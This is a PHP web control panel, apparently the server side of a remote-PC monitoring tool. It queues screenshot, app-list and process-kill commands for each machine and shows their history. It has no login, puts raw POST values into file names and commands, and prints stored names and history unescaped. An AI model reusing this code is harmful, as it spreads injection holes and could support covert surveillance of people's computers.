<?php
$imgDir = 'screenshots/';
$namesFile = 'names.json';
if (!is_dir($imgDir)) mkdir($imgDir);

// Загрузка имен
$names = file_exists($namesFile) ? json_decode(file_get_contents($namesFile), true) : [];

// Обработка переименования
if (isset($_POST['set_name'])) {
    $names[$_POST['pc_id']] = $_POST['new_name'];
    file_put_contents($namesFile, json_encode($names));
    header("Location: /"); exit;
}

// Обработка команд (Kill/Screen/Apps)
if (isset($_POST['set_cmd'])) {
    $cmd = $_POST['set_cmd'] . (isset($_POST['proc_name']) ? ' ' . $_POST['proc_name'] : '');
    file_put_contents("cmd_" . $_POST['pc_id'] . ".txt", $cmd);
    header("Location: /"); exit;
}

// Автоматический сбор списка всех ПК из файлов статуса
$pc_files = glob("status_*.txt");
$pcs = [];
foreach ($pc_files as $f) {
    $pcs[] = str_replace(['status_', '.txt'], '', basename($f));
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Панель управления</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; padding: 20px; }
        .pc-card { background: #1e293b; padding: 20px; margin: 10px; border-radius: 12px; border: 1px solid #475569; width: 400px; display: inline-block; vertical-align: top; }
        .status { padding: 4px 8px; border-radius: 4px; font-size: 12px; }
        .online { background: #22c55e; }
        .offline { background: #ef4444; }
        pre { background: #000; height: 250px; overflow-y: auto; font-size: 12px; color: #38bdf8; padding: 10px; }
    </style>
</head>
<body>
    <h1>Панель управления</h1>
    <?php 
    foreach($pcs as $pc) {
        $lastSeen = (int)file_get_contents("status_$pc.txt");
        $isOnline = (time() - $lastSeen) < 60;
        $displayName = $names[$pc] ?? $pc;
        $statusLabel = $isOnline ? "Онлайн" : "Офлайн";
        $statusClass = $isOnline ? "online" : "offline";
        $history = file_exists("history_$pc.txt") ? file_get_contents("history_$pc.txt") : "Нет данных";

        echo "<div class='pc-card'>
                <h3>$displayName <span class='status $statusClass'>$statusLabel</span></h3>
                <form method='POST'>
                    <input type='hidden' name='pc_id' value='$pc'>
                    <input type='text' name='new_name' placeholder='Имя' style='width:80px'>
                    <button name='set_name' value='1'>✏️</button>
                </form>
                <form method='POST' style='margin-top:10px;'>
                    <input type='hidden' name='pc_id' value='$pc'>
                    <button name='set_cmd' value='screen'>📸</button>
                    <button name='set_cmd' value='app'>📋</button>
                    <input type='text' name='proc_name' placeholder='Process' style='width:80px'>
                    <button name='set_cmd' value='delete'>❌</button>
                </form>
                <p>История:</p><pre>$history</pre>
              </div>";
    }
    ?>
</body>
</html>
